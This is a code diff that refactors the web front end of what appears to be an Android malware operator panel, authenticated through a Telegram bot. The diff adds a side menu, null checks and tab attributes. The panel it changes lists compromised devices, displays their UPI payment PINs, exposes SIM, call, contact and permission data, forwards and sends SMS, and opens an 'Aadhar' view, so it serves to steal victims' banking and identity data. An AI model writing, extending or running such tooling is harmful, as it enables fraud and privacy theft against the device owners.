@@ -1,4 +1,4 @@
-var PANEL_BUILD=8;
+var PANEL_BUILD=9;
 var AUTH_URL='';
 var SMS_TOKEN_URL='';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
@@ -141,8 +141,8 @@ initFirebase();
 function updateFbUi(){
   var inst=getFbInstance(activeFbId);
   var name=inst?inst.name:'—';
-  document.getElementById('fbChip').textContent=name;
-  document.getElementById('moreFbName').textContent=name;
+  var chip=document.getElementById('fbChip');if(chip)chip.textContent=name;
+  var moreFb=document.getElementById('moreFbName');if(moreFb)moreFb.textContent=name;
   document.getElementById('hdrSub').textContent=inst?(getFilteredDevs().length+' devices · '+name):'No Firebase';
   var html=firebaseConfigs.map(function(c){
     var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
@@ -444,7 +444,7 @@ function updatePanelVersionBadge(){
   if(window.RebelAndroid&&RebelAndroid.getPanelVersion){
     try{v=RebelAndroid.getPanelVersion()||v;}catch(e){}
   }
-  el.textContent='Panel v'+v+' · sex.php features ON';
+  el.textContent='Panel v'+v+' · Solid UI';
 }
 function updateStats(){
   var l=getFilteredDevs();
@@ -537,11 +537,11 @@ function renderDeviceView(){
     '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
     '<div class="hero-cell"><div class="hero-lbl">UPI PIN</div><div class="hero-val" id="heroUpi">'+esc(upi||'—')+'</div></div>'+
     '</div><div class="dev-tabs">'+
-    '<button class="dev-tab active" onclick="switchDevTab(\'sim\',this)">SIM</button>'+
-    '<button class="dev-tab" onclick="switchDevTab(\'calls\',this)">Calls</button>'+
-    '<button class="dev-tab" onclick="switchDevTab(\'contacts\',this)">Contacts</button>'+
-    '<button class="dev-tab" onclick="switchDevTab(\'perms\',this)">Perms</button>'+
-    '<button class="dev-tab" onclick="switchDevTab(\'forward\',this)">Forward</button>'+
+    '<button class="dev-tab active" data-tab="sim" onclick="switchDevTab(\'sim\',this)">SIM</button>'+
+    '<button class="dev-tab" data-tab="calls" onclick="switchDevTab(\'calls\',this)">Calls</button>'+
+    '<button class="dev-tab" data-tab="contacts" onclick="switchDevTab(\'contacts\',this)">Contacts</button>'+
+    '<button class="dev-tab" data-tab="perms" onclick="switchDevTab(\'perms\',this)">Perms</button>'+
+    '<button class="dev-tab" data-tab="forward" onclick="switchDevTab(\'forward\',this)">Forward</button>'+
     '</div>'+
     '<div class="dev-section active" id="devtab-sim"><div id="simList" class="data-list"></div></div>'+
     '<div class="dev-section" id="devtab-calls"><div id="callsList" class="data-list"></div></div>'+
@@ -645,23 +645,52 @@ function sendSms(){
   });
 }
 
-var TAB_ORDER=['home','device','sms','send','more'],_lastTab='home';
+var TAB_ORDER=['home','device','sms','send'],_lastTab='home';
 function switchTab(name,btn){
-  var oldIdx=TAB_ORDER.indexOf(_lastTab),newIdx=TAB_ORDER.indexOf(name);
-  var dir=newIdx>oldIdx?'from-right':'from-left';
-  var prev=document.querySelector('.screen.active');
-  if(prev&&prev.id!=='screen-'+name){prev.classList.add('leaving');setTimeout(function(){prev.classList.remove('leaving');},450);}
-  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active','from-left','from-right');});
+  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
   var screen=document.getElementById('screen-'+name);
-  if(screen&&oldIdx>=0&&newIdx>=0&&oldIdx!==newIdx)screen.classList.add(dir);
-  screen.classList.add('active');
+  if(screen)screen.classList.add('active');
   document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
   if(btn){btn.classList.add('active');moveNavGlow(btn);}
+  else{
+    var navBtn=document.querySelector('.nav-item[data-tab="'+name+'"]');
+    if(navBtn){navBtn.classList.add('active');moveNavGlow(navBtn);}
+  }
   _lastTab=name;
   if(name==='sms'&&selDev)loadSmsForDevice();
   if(name==='device')renderDeviceView();
   if(name==='send')updateSendForm();
 }
+function closeSideMenu(){
+  var bg=document.getElementById('sideMenuBg'),menu=document.getElementById('sideMenu'),btn=document.getElementById('menuBtn');
+  if(bg)bg.classList.remove('open');
+  if(menu)menu.classList.remove('open');
+  if(btn)btn.classList.remove('open');
+}
+function toggleSideMenu(){
+  var menu=document.getElementById('sideMenu');
+  if(menu&&menu.classList.contains('open')){closeSideMenu();return;}
+  var bg=document.getElementById('sideMenuBg'),btn=document.getElementById('menuBtn');
+  if(bg)bg.classList.add('open');
+  if(menu)menu.classList.add('open');
+  if(btn)btn.classList.add('open');
+}
+function menuGo(name){closeSideMenu();switchTab(name,null);}
+function menuDevTab(name){
+  closeSideMenu();
+  if(!getSelDev()){toast('Pehle Home se device select karo',false);menuGo('home');return;}
+  switchTab('device',null);
+  setTimeout(function(){
+    var btn=document.querySelector('.dev-tab[data-tab="'+name+'"]');
+    switchDevTab(name,btn);
+  },40);
+}
+function menuOpenFb(){closeSideMenu();openFbSheet();}
+function menuToggleAutoToken(){closeSideMenu();toggleAutoToken();}
+function menuSetAutoDevice(){closeSideMenu();useSelForAutoToken();}
+function menuOpenAadhar(){closeSideMenu();openAadhar();}
+function menuRefresh(){closeSideMenu();refreshData();}
+function menuLogout(){closeSideMenu();doLogout();}
 
 /* AUTH — server keys via RebelAndroid (bot /genkey on @Rebelpanelbot) */
 function parseJson(s){try{return JSON.parse(s);}catch(e){return null;}}
